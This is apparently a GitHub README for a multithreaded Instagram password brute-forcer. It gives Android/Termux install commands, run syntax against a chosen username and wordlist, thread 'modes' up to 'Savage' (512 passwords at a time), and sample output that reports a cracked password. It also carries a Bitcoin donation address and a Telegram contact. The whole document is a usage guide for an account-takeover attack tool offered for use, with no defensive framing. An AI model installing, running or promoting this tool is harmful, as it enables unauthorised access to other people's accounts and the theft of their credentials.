# Instagram
Hi, this is a Instagram brute-forcer<br>
# Donate
<b>Who does not mind a penny on the development of the project:</b><br>
<b>Bitcoin: 1LBjGEQ16jK23cVqtkFg5fm91poKVVAP5b<br>
<br>
There will be questions - Telegram: <a href="https://t.me/Mrxanon"> @Mrxanon</a><br>
# How to install?
<b>Follow the instructions...</b><br>
<b>If you have Android - download <a href="https://play.google.com/store/apps/details?id=com.termux&hl=ru">Termux from Google Play</a> and open it and write the commands below:<br>
• <code>apt update</code><br>
• <code>apt upgrade -y</code><br>
• <code>apt install python -y</code><br>
• <code>apt install git -y</code><br>
• <code>git clone https://github.com/Mr-X-01/Insta</code><br>
• <code>cd Instagram</code><br>
• <code>pip3 install -r requirements.txt</code><br>
# How to start?
• <code>python3 instagram.py 'username' 'wordlist' -m 'mode'</code><br>
# How to generate passwords?
• <code>python setup.py</code><br>
# How to unzip?
• <code>unzip 'file'</code><br>

### Help

```
python3 instagram.py -h
usage: instagram.py [-h] [-m MODE] username wordlist

positional arguments:
  username              email or username
  wordlist              password list

optional arguments:
  -h, --help            show this help message and exit
  -m MODE, --mode MODE  modes: 0 => 32 bots; 1 => 16 bots; 2 => 8 bots; 3 => 4 bots
```

### Bots(Threads)

-   4 bots: 64 passwords at a time
-   8 bots: 128 passwords at a time
-   16 bots: 256 passwords at a time
-   32 bots: 512 passwords at a time

### Modes

-   0: 32 bots
-   1: 16 bots
-   2: 8 bots
-   3: 4 bots

### Chill mode

This mode uses only 4 bots, or 64 passwords at a time.

```
python3 instagram.py Mr.x pass.lst -m 3
```

### Moderate mode 1

This mode uses 8 bots, or 128 passwords at a time.

```
python3 instagram.py Mr.x pass.lst -m 2
```

### Moderate mode 2

This mode uses 16 bots, or 256 passwords at a time.

```
python3 instagram.py Mr.x pass.lst -m 1
```

### Savage mode

This mode uses 32 bots, or 512 passwords at a time.

```
python3 instagram.py Mr.x pass.lst -m 0
```

### If you don't specify a mode, then mode is set to 2

### Run

```
[-] Wordlist: pass.lst
[-] Username: Mr.x
[-] Password: 272
[-] Complete: 45.51%
[-] Attempts: 228
[-] Browsers: 273
[-] Exists: True
```

### Stop

```
[-] Wordlist: pass.lst
[-] Username: Mr.x
[-] Password: mr090
[-] Complete: 62.67%
[-] Attempts: 314
[-] Browsers: 185
[-] Exists: True

[!] Password Found
[+] Username: Mr.x
[+] Password: mr090
```
